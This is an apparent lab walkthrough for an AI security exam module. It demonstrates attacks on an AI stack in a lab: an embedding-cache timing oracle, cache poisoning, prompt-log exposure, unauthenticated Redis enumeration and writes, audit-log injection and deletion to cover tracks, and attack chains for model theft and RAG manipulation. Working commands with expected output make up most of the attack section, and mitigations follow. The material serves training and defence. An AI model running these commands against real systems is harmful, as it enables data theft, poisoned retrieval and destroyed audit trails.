+<div class="code-block"><div class="code-header"><span>Same text again &mdash; observe the 400x speed difference</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><pre>curl -s -X POST http://192.168.19.1:8010/embed \
+  -H "Content-Type: application/json" \
+  -d '{"text": "quarterly revenue projections for Q3", "model": "llama3"}' \
+  | python3 -c '
+import sys, json
+d = json.load(sys.stdin)
+print(f"cached: {d.get(\"cached\")}  elapsed_ms: {d.get(\"elapsed_ms\")}")
+'</pre></div>
+
+<div class="expected-label">Expected Output</div>
+<div class="expected-output">cached: True  elapsed_ms: 0.99</div>
+
+<div class="info-box danger">
+  <div class="label">Timing Oracle Attack</div>
+  The 400x timing difference (426ms vs 1ms) is an unmistakable side-channel. Even without the explicit <code>"cached": true</code> field, an attacker can determine:
+  <ul>
+    <li><strong>What data has been processed</strong>: Probe with specific phrases to see if they're cached</li>
+    <li><strong>User activity patterns</strong>: Determine what topics users have been querying</li>
+    <li><strong>Sensitive content detection</strong>: Check if confidential terms like "acquisition target", "layoff plans", or "merger with $COMPANY" have been embedded</li>
+  </ul>
+  This is a <strong>membership inference attack</strong> on the embedding cache.
+</div>
+
+<h4>Similarity Endpoint</h4>
+
+<div class="code-block"><div class="code-header"><span>Compare semantic similarity between texts</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><pre>curl -s -X POST http://192.168.19.1:8010/similarity \
+  -H "Content-Type: application/json" \
+  -d '{"text_a": "machine learning", "text_b": "artificial intelligence", "model": "llama3"}' \
+  | python3 -m json.tool</pre></div>
+
+<div class="expected-label">Expected Output</div>
+<div class="expected-output">{
+  "text_a": "machine learning",
+  "text_b": "artificial intelligence",
+  "cosine_similarity": 0.7881074109831595
+}</div>
+
+<p>The similarity endpoint helps attackers craft adversarial inputs by measuring how close their perturbations are to target embeddings. It's also useful for understanding the model's semantic space.</p>
+
+<!-- STEP 5 -->
+<div class="step-title" id="step5"><span class="step-num">5</span> Embedding Cache Poisoning</div>
+
+<p>The <code>/cache/set</code> endpoint allows <strong>direct cache writes</strong> with no authentication. An attacker can inject arbitrary embedding vectors for any text, corrupting all downstream consumers (RAG pipelines, search, classification).</p>
+
+<h4>Inject a Poisoned Embedding</h4>
+
+<div class="code-block"><div class="code-header"><span>Poison the cache with a zero vector for sensitive text</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><pre>curl -s -X POST http://192.168.19.1:8010/cache/set \
+  -H "Content-Type: application/json" \
+  -d '{"text": "the company revenue is $10M", "model": "llama3", "embedding": [0.0, 0.0, 0.0, 0.0, 0.0]}' \
+  | python3 -m json.tool</pre></div>
+
+<div class="expected-label">Expected Output</div>
+<div class="expected-output">{
+  "status": "cached",
+  "key": "emb:a027e661b06b6d574b3a988acb107d5729f3fba1b70308bd083e7b8f8574d58a"
+}</div>
+
+<h4>Verify the Poison</h4>
+
+<div class="code-block"><div class="code-header"><span>Request the embedding &mdash; gets poisoned zero vector</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><pre>curl -s -X POST http://192.168.19.1:8010/embed \
+  -H "Content-Type: application/json" \
+  -d '{"text": "the company revenue is $10M", "model": "llama3"}' \
+  | python3 -c '
+import sys, json
+d = json.load(sys.stdin)
+print(f"cached: {d.get(\"cached\")}  elapsed_ms: {d.get(\"elapsed_ms\")}  embedding: {d.get(\"embedding\")}")
+'</pre></div>
+
+<div class="expected-label">Expected Output</div>
+<div class="expected-output">cached: True  elapsed_ms: 0.24  embedding: [0.0, 0.0, 0.0, 0.0, 0.0]</div>
+
+<div class="info-box danger">
+  <div class="label">Cache Poisoning Impact</div>
+  The poisoned zero vector is now returned for "the company revenue is $10M" instead of its real embedding. In a RAG pipeline, this means:
+  <ul>
+    <li>The text will have <strong>zero similarity</strong> to all queries &mdash; it effectively becomes invisible</li>
+    <li>An attacker could hide sensitive documents from search results by zeroing their embeddings</li>
+    <li>Or, inject embeddings that make irrelevant/malicious content appear similar to legitimate queries</li>
+    <li>The poisoned entry has a 1-hour TTL (ex=3600), so the corruption persists until expiry</li>
+  </ul>
+</div>
+
+<h4>Dump All Cached Embeddings</h4>
+
+<div class="code-block"><div class="code-header"><span>Exfiltrate all cached embeddings (up to 500)</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><pre>curl -s http://192.168.19.1:8010/cache/dump | python3 -c '
+import sys, json
+d = json.load(sys.stdin)
+print(f"Total cached embeddings: {d.get(\"cached_embeddings\")}")
+for k, v in list(d.get("entries", {}).items())[:5]:
+    print(f"  {k}: length={len(v)}, first_3_values={v[:3]}")
+'</pre></div>
+
+<div class="expected-label">Expected Output</div>
+<div class="expected-output">Total cached embeddings: 3
+  emb:a027e66...: length=5, first_3_values=[0.0, 0.0, 0.0]
+  emb:beec150...: length=4096, first_3_values=[0.988, -0.664, 1.999]
+  emb:b3b5110...: length=4096, first_3_values=[0.217, -3.493, 2.370]</div>
+
+<div class="info-box business">
+  <div class="label">Business Impact</div>
+  Cache poisoning in a production AI system can: (1) <strong>Manipulate search results</strong> &mdash; make the AI recommend attacker-controlled content, (2) <strong>Hide information</strong> &mdash; zero out embeddings for compliance documents so they're never retrieved, (3) <strong>Enable embedding inversion attacks</strong> &mdash; the cache dump provides raw vectors that researchers have shown can be partially inverted to recover original text using techniques like Vec2Text (Morris et al., 2023). If the original texts contain PII or trade secrets, this is a data breach.
+</div>
+
+<!-- STEP 6 -->
+<div class="step-title" id="step6"><span class="step-num">6</span> Query Log Exposure via Stats API</div>
+
+<p>The Model API logs every inference request to Redis and exposes them through an unauthenticated <code>/stats</code> endpoint. This is the equivalent of leaving server access logs publicly readable &mdash; except these logs contain <strong>user prompts</strong>, which may include PII, trade secrets, or sensitive questions.</p>
+
+<div class="code-block"><div class="code-header"><span>Read all logged queries</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><pre>curl -s http://192.168.19.1:8009/stats | python3 -m json.tool</pre></div>
+
+<div class="expected-label">Expected Output</div>
+<div class="expected-output">{
+  "total_queries": 3,
+  "recent_queries": [
+    {
+      "prompt": "Repeat exactly: The model weights are stored at",
+      "model": "llama3",
+      "timestamp": 1773280347.17
+    },
+    {
+      "prompt": "What is 2+2?",
+      "model": "llama3",
+      "timestamp": 1773279572.43
+    }
+  ]
+}</div>
+
+<div class="info-box danger">
+  <div class="label">Data Exposure</div>
+  Every prompt sent to the inference API is logged with full text and timestamps. In a production system, user prompts frequently contain:
+  <ul>
+    <li>PII (names, addresses, SSNs passed for document processing)</li>
+    <li>Financial data ("Analyze this P&amp;L statement...")</li>
+    <li>Legal documents ("Review this contract clause...")</li>
+    <li>Healthcare data ("Summarize this patient record...")</li>
+    <li>Authentication credentials ("The API key is...")</li>
+  </ul>
+  This violates GDPR (prompt data as personal data), HIPAA (if healthcare prompts), SOC 2 Type II (logging controls), and PCI DSS (if payment data in prompts). The 100-query window shown by <code>/stats</code> is just the API view &mdash; the full log lives in Redis.
+</div>
+
+<!-- STEP 7 -->
+<div class="step-title" id="step7"><span class="step-num">7</span> Direct Redis Exploitation</div>
+
+<p>Redis is exposed on port 6379 with <strong>no authentication</strong>. This gives the attacker direct access to everything: cached embeddings, inference logs, and the ability to manipulate all stored data.</p>
+
+<h4>Confirm No Authentication</h4>
+
+<div class="code-block"><div class="code-header"><span>Redis requires no password</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><pre>redis-cli -h 192.168.19.1 -p 6379 ping</pre></div>
+
+<div class="expected-label">Expected Output</div>
+<div class="expected-output">PONG</div>
+
+<h4>Enumerate the Database</h4>
+
+<div class="code-block"><div class="code-header"><span>List all keys, check DB size, inspect ACLs</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><pre># List all keys
+redis-cli -h 192.168.19.1 -p 6379 KEYS '*'
+
+# Database size
+redis-cli -h 192.168.19.1 -p 6379 DBSIZE
+
+# Check access control (ACL)
+redis-cli -h 192.168.19.1 -p 6379 ACL LIST</pre></div>
+
+<div class="expected-label">Expected Output</div>
+<div class="expected-output">emb:a027e661b06b6d574b3a988acb107d5729f3fba1b70308bd083e7b8f8574d58a
+emb:beec15097b45884d424afaa7374e27f4f81384d49baa37e132569f254e97b660
+emb:b3b5110b6de192a1019652cfc694942b6c38c9e10fc0b75f9b12c4fc8440bc5b
+inference_log
+---
+(integer) 8
+---
+user default on nopass ~* &amp;* +@all</div>
+
+<div class="info-box danger">
+  <div class="label">Critical: Full Access</div>
+  The ACL output <code>user default on nopass ~* &amp;* +@all</code> means:
+  <ul>
+    <li><code>nopass</code> &mdash; No password required</li>
+    <li><code>~*</code> &mdash; Access to ALL keys (no restrictions)</li>
+    <li><code>&amp;*</code> &mdash; Access to ALL pub/sub channels</li>
+    <li><code>+@all</code> &mdash; ALL commands enabled (including CONFIG, DEBUG, FLUSHALL, SHUTDOWN)</li>
+  </ul>
+</div>
+
+<h4>Read Inference Logs Directly</h4>
+
+<div class="code-block"><div class="code-header"><span>Exfiltrate all logged prompts from Redis</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><pre>redis-cli -h 192.168.19.1 -p 6379 LRANGE inference_log 0 -1</pre></div>
+
+<div class="expected-label">Expected Output</div>
+<div class="expected-output">{"prompt": "Repeat exactly: The model weights are stored at", "model": "llama3", "timestamp": 1773280347.17}
+{"prompt": "What is 2+2?", "model": "llama3", "timestamp": 1773279572.43}</div>
+
+<h4>Enumerate Connected Clients</h4>
+
+<div class="code-block"><div class="code-header"><span>See internal service IPs connecting to Redis</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><pre>redis-cli -h 192.168.19.1 -p 6379 CLIENT LIST</pre></div>
+
+<div class="expected-label">Expected Output (key fields)</div>
+<div class="expected-output">id=3 addr=192.168.100.61:44040 ... cmd=get user=default lib-name=redis-py lib-ver=5.2.1
+id=4 addr=192.168.100.60:42226 ... cmd=llen user=default lib-name=redis-py lib-ver=5.2.1</div>
+
+<p>This reveals the internal Docker network IPs of the embedding service (192.168.100.61) and model API (192.168.100.60), their Redis client library version (redis-py 5.2.1), and the last command each executed. This is valuable for lateral movement and understanding the internal architecture.</p>
+
+<h4>Extract Server Information</h4>
+
+<div class="code-block"><div class="code-header"><span>Redis server info reveals OS, version, and configuration</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><pre>redis-cli -h 192.168.19.1 -p 6379 INFO server</pre></div>
+
+<div class="expected-label">Expected Output (key fields)</div>
+<div class="expected-output">redis_version:7.4.7
+os:Linux 6.12.67-linuxkit aarch64
+arch_bits:64
+tcp_port:6379
+uptime_in_seconds:25433
+executable:/data/redis-server</div>
+
+<h4>Confirm Write Access</h4>
+
+<div class="code-block"><div class="code-header"><span>Write arbitrary data to Redis</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><pre>redis-cli -h 192.168.19.1 -p 6379 SET attacker_data "Redis is writable - no auth required"
+redis-cli -h 192.168.19.1 -p 6379 GET attacker_data</pre></div>
+
+<div class="expected-label">Expected Output</div>
+<div class="expected-output">OK
+"Redis is writable - no auth required"</div>
+
+<h4>Read Redis Configuration</h4>
+
+<div class="code-block"><div class="code-header"><span>Dump full Redis config (confirm no security controls)</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><pre>redis-cli -h 192.168.19.1 -p 6379 CONFIG GET requirepass
+redis-cli -h 192.168.19.1 -p 6379 CONFIG GET protected-mode</pre></div>
+
+<div class="expected-label">Expected Output</div>
+<div class="expected-output">requirepass
+""
+---
+protected-mode
+"no"</div>
+
+<div class="info-box business">
+  <div class="label">Business Impact</div>
+  Unauthenticated Redis access is consistently rated as a critical vulnerability. Notable incidents include the 2020 attack where researchers found 75,000+ Redis instances exposed to the internet. In this AI context, Redis holds: (1) all user prompts ever sent to the inference API (data breach), (2) all cached embeddings (IP theft), (3) write access to corrupt any cached data (integrity). With <code>CONFIG SET</code> access, an attacker could even change the Redis configuration at runtime, enable disk persistence to a world-readable path, or use Redis as a stepping stone for further attacks (Redis RCE via CONFIG SET dir/dbfilename).
+</div>
+
+<!-- STEP 8 -->
+<div class="step-title" id="step8"><span class="step-num">8</span> Redis Log Injection &amp; Audit Tampering</div>
+
+<p>Since Redis is writable, an attacker can inject fake entries into the <code>inference_log</code> list. This corrupts audit trails and can frame users for queries they never made.</p>
+
+<h4>Inject Fake Log Entry</h4>
+
+<div class="code-block"><div class="code-header"><span>Insert a fabricated inference log via Redis</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><pre>redis-cli -h 192.168.19.1 -p 6379 LPUSH inference_log \
+  '{"prompt": "INJECTED BY ATTACKER - fake log entry", "model": "evil-model", "timestamp": 9999999999}'</pre></div>
+
+<div class="expected-label">Expected Output</div>
+<div class="expected-output">(integer) 2</div>
+
+<h4>Verify via Stats API</h4>
+
+<div class="code-block"><div class="code-header"><span>The injected entry appears in the stats API</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><pre>curl -s http://192.168.19.1:8009/stats | python3 -m json.tool</pre></div>
+
+<div class="expected-label">Expected Output</div>
+<div class="expected-output">{
+  "total_queries": 4,
+  "recent_queries": [
+    {
+      "prompt": "INJECTED BY ATTACKER - fake log entry",
+      "model": "evil-model",
+      "timestamp": 9999999999
+    },
+    {
+      "prompt": "Repeat exactly: The model weights are stored at",
+      "model": "llama3",
+      "timestamp": 1773280347.17
+    },
+    ...
+  ]
+}</div>
+
+<div class="info-box danger">
+  <div class="label">Audit Trail Compromise</div>
+  The attacker can:
+  <ul>
+    <li><strong>Inject</strong>: Add fake entries to frame users or obscure real activity</li>
+    <li><strong>Delete</strong>: Use <code>LREM</code> or <code>LTRIM</code> to remove evidence of their queries</li>
+    <li><strong>Modify</strong>: Replace entries with altered timestamps or prompts</li>
+    <li><strong>Destroy</strong>: <code>DEL inference_log</code> to wipe the entire audit trail</li>
+  </ul>
+  In regulated industries, audit log integrity is a compliance requirement (SOC 2, HIPAA, PCI DSS). Tampered logs invalidate the entire audit trail and can result in regulatory penalties.
+</div>
+
+<h4>Clean Evidence of Attacker's Queries</h4>
+
+<div class="code-block"><div class="code-header"><span>Remove specific log entries to cover tracks</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><pre># Remove the fake entry we injected
+redis-cli -h 192.168.19.1 -p 6379 LREM inference_log 1 \
+  '{"prompt": "INJECTED BY ATTACKER - fake log entry", "model": "evil-model", "timestamp": 9999999999}'
+
+# Or wipe the entire log (destructive)
+# redis-cli -h 192.168.19.1 -p 6379 DEL inference_log</pre></div>
+
+<!-- ═══════════════════════════════════════════ CHAINING ═══════════════════════════════════════════ -->
+<hr>
+
+<h2 id="chaining">Advanced: Attack Chaining</h2>
+
+<p>The real power of infrastructure attacks comes from combining multiple vulnerabilities into a coherent kill chain.</p>
+
+<h3>Chain 1: Complete Model Theft</h3>
+
+<div class="info-box concept">
+  <div class="label">Attack Chain</div>
+  <ol>
+    <li><strong>Enumerate</strong> (Step 1): <code>/models</code> reveals model names and quantization</li>
+    <li><strong>Blueprint</strong> (Step 2): <code>/model/llama3/info</code> gives full architecture, tensor layout, prompt template</li>
+    <li><strong>Extract</strong> (Step 3): <code>/batch</code> sends 50 prompts per request with no rate limit. Run 2,000 batch requests = 100,000 prompt-response pairs</li>
+    <li><strong>Replicate</strong>: Use the architecture info + extracted data to fine-tune an open-source base model to match the target's behavior</li>
+  </ol>
+  Total cost: A few hours of automated queries. Value of stolen model: potentially millions in R&amp;D investment.
+</div>
+
+<h3>Chain 2: Silent RAG Manipulation</h3>
+
+<div class="info-box concept">
+  <div class="label">Attack Chain</div>
+  <ol>
+    <li><strong>Probe</strong> (Step 4): Use timing oracle to determine what texts are cached (what the system has processed)</li>
+    <li><strong>Poison</strong> (Step 5): Inject modified embeddings via <code>/cache/set</code> that make attacker-controlled content appear relevant to financial queries</li>
+    <li><strong>Cover</strong> (Step 8): Clean inference logs via Redis to remove any evidence of reconnaissance queries</li>
+    <li><strong>Result</strong>: The RAG pipeline now returns attacker-influenced content for specific queries, while audit logs show no suspicious activity</li>
+  </ol>
+</div>
+
+<h3>Chain 3: Full Data Exfiltration</h3>
+
+<div class="info-box concept">
+  <div class="label">Attack Chain</div>
+  <ol>
+    <li><strong>Redis Access</strong> (Step 7): Connect directly to Redis with no auth</li>
+    <li><strong>Extract Logs</strong>: <code>LRANGE inference_log 0 -1</code> dumps all user prompts ever sent</li>
+    <li><strong>Extract Cache</strong>: <code>/cache/dump</code> or <code>KEYS emb:*</code> + <code>GET</code> retrieves all cached embeddings</li>
+    <li><strong>Inversion</strong>: Apply Vec2Text or similar techniques to recover original text from embeddings</li>
+    <li><strong>Cover</strong>: Delete attacker keys, trim logs, leave no trace</li>
+  </ol>
+  Result: Full exfiltration of all user queries and cached data with no forensic evidence.
+</div>
+
+<!-- ═══════════════════════════════════════════ MITIGATIONS ═══════════════════════════════════════════ -->
+<hr>
+
+<h2 id="mitigations">Defensive Mitigations</h2>
+
+<h3>1. API Authentication &amp; Authorization</h3>
+
+<div class="code-block"><div class="code-header"><span>Add API key authentication to all endpoints</span></div><pre>from fastapi import Depends, HTTPException, Security
+from fastapi.security import APIKeyHeader
+
+api_key_header = APIKeyHeader(name="X-API-Key")
+
+async def verify_api_key(api_key: str = Security(api_key_header)):
+    if api_key != os.getenv("API_KEY"):
+        raise HTTPException(status_code=403, detail="Invalid API key")
+    return api_key
+
+@app.post("/inference")
+async def inference(payload: dict, api_key: str = Depends(verify_api_key)):
+    # Now requires valid API key
+    ...</pre></div>
+
+<h3>2. Rate Limiting</h3>
+
+<div class="code-block"><div class="code-header"><span>Implement per-key rate limiting with slowapi</span></div><pre>from slowapi import Limiter
+from slowapi.util import get_remote_address
+
+limiter = Limiter(key_func=get_remote_address)
+
+@app.post("/inference")
+@limiter.limit("10/minute")  # 10 requests per minute per IP
+async def inference(request: Request, payload: dict):
+    ...</pre></div>
+
+<h3>3. Redis Authentication &amp; Network Isolation</h3>
+
+<div class="code-block"><div class="code-header"><span>Secure Redis configuration</span></div><pre># docker-compose.yml
+redis:
+  image: redis:7-alpine
+  command: >
+    redis-server
+    --requirepass "${REDIS_PASSWORD}"
+    --rename-command CONFIG ""
+    --rename-command DEBUG ""
+    --rename-command FLUSHALL ""
+    --rename-command SHUTDOWN ""
+    --protected-mode yes
+    --maxmemory 256mb
+    --maxmemory-policy allkeys-lru
+  # DO NOT expose to host network
+  # ports:
+  #   - "6379:6379"
+  networks:
+    - internal-only  # Separate network, not exposed</pre></div>
+
+<h3>4. Remove Information Disclosure</h3>
+
+<div class="code-block"><div class="code-header"><span>Strip sensitive metadata from responses</span></div><pre># Don't expose /models or /model/info endpoints publicly
+# If needed, return only model name, not architecture details
+
+# Don't return timing info
+return {
+    "response": result.get("response", ""),
+    "model": model,
+    # REMOVED: elapsed_ms, tokens, prompt_tokens
+}
+
+# Don't expose /stats endpoint publicly
+# Move to internal admin API with separate auth</pre></div>
+
+<h3>5. Timing Side-Channel Protection</h3>
+
+<div class="code-block"><div class="code-header"><span>Add constant-time response padding</span></div><pre>import asyncio
+
+MIN_RESPONSE_TIME = 0.5  # 500ms minimum
+
+@app.post("/embed")
+async def embed(payload: dict):
+    start = time.time()
+    # ... process embedding ...
+    elapsed = time.time() - start
+
+    # Pad response time to minimum threshold
+    if elapsed < MIN_RESPONSE_TIME:
+        await asyncio.sleep(MIN_RESPONSE_TIME - elapsed)
+
+    return {"embedding": embedding, "model": model}
+    # REMOVED: elapsed_ms, cached fields</pre></div>
+
+<h3>6. Input Logging Controls</h3>
+
+<div class="code-block"><div class="code-header"><span>Hash or anonymize logged prompts</span></div><pre>import hashlib
+
+# Log hash instead of full prompt
+prompt_hash = hashlib.sha256(prompt.encode()).hexdigest()
+redis_client.lpush("inference_log", json.dumps({
+    "prompt_hash": prompt_hash,  # Not the actual prompt
+    "model": model,
+    "timestamp": time.time(),
+    "prompt_length": len(prompt),  # Metadata only
+}))
+
+# Set TTL on logs (auto-expire after 24 hours)
+redis_client.expire("inference_log", 86400)</pre></div>
+
+<h3>7. Cache Security</h3>
+
+<div class="code-block"><div class="code-header"><span>Remove direct cache manipulation endpoints</span></div><pre># DELETE these endpoints entirely:
+# /cache/dump  - No legitimate need to expose raw embeddings
+# /cache/set   - No legitimate need for external cache writes
+
+# If cache management is needed, use internal admin API
+# with separate authentication and audit logging</pre></div>
+
+<!-- ═══════════════════════════════════════════ OSAI+ ═══════════════════════════════════════════ -->
+<hr>
+
+<h2 id="osai-topics">OSAI+ Exam Topics Covered</h2>
+
+<table>
+  <tr><th>OSAI+ Domain</th><th>Topic</th><th>Lab Coverage</th></tr>
+  <tr><td>AI Model Security</td><td>Model Extraction / Stealing</td><td>Steps 1-3: Enumeration, architecture disclosure, unrestricted batch inference</td></tr>
+  <tr><td>AI Model Security</td><td>Model Information Disclosure</td><td>Step 2: Full architecture, tensor layout, prompt template, weight paths</td></tr>
+  <tr><td>AI Infrastructure</td><td>Side-Channel Attacks</td><td>Step 4: Timing oracle on embedding cache (400x speed difference)</td></tr>
+  <tr><td>AI Infrastructure</td><td>Cache Poisoning</td><td>Step 5: Direct cache write to corrupt embeddings for downstream RAG</td></tr>
+  <tr><td>AI Infrastructure</td><td>Data Exposure</td><td>Steps 6-7: Query logs with full prompts exposed via API and Redis</td></tr>
+  <tr><td>AI Infrastructure</td><td>Unauthenticated Services</td><td>Step 7: Redis with no auth, full ACL, all commands enabled</td></tr>
+  <tr><td>AI Infrastructure</td><td>Audit Log Tampering</td><td>Step 8: Inject, modify, or delete inference logs via Redis</td></tr>
+  <tr><td>AI Infrastructure</td><td>Network Reconnaissance</td><td>Step 7: CLIENT LIST reveals internal IPs, library versions, commands</td></tr>
+  <tr><td>MITRE ATLAS</td><td>AML.T0040 - ML Model Access</td><td>Unrestricted API access enabling model queries</td></tr>
+  <tr><td>MITRE ATLAS</td><td>AML.T0044 - Full ML Model Access</td><td>Architecture + weights path disclosure</td></tr>
+  <tr><td>MITRE ATLAS</td><td>AML.T0024 - Exfiltration via ML Inference API</td><td>Batch extraction of model behavior</td></tr>
+  <tr><td>MITRE ATLAS</td><td>AML.T0020 - Poison Training Data</td><td>Cache poisoning corrupts embedding-based retrieval</td></tr>
+  <tr><td>Compliance</td><td>GDPR, HIPAA, SOC 2, PCI DSS</td><td>Prompt logging without consent, no access controls, log tampering</td></tr>
+</table>
+
+<div class="info-box success">
+  <div class="label">Key Takeaway</div>
+  AI infrastructure vulnerabilities are often <strong>more damaging</strong> than model-level attacks because they provide access to all user data, enable persistent manipulation, and are harder to detect. A prompt injection affects one query; a compromised Redis affects <strong>every user, every query, every cached result</strong>. The OSAI+ exam expects candidates to understand that securing AI means securing the entire stack &mdash; not just the model weights, but the caching layers, logging pipelines, and network boundaries that surround them.
+</div>
+
+<div class="footer">
+  OSAI+ Lab Walkthrough &mdash; Module 5: AI Infrastructure Attacks<br>
+  All commands tested against live lab environment &mdash; March 2026
+</div>
+
+</body>
+</html>
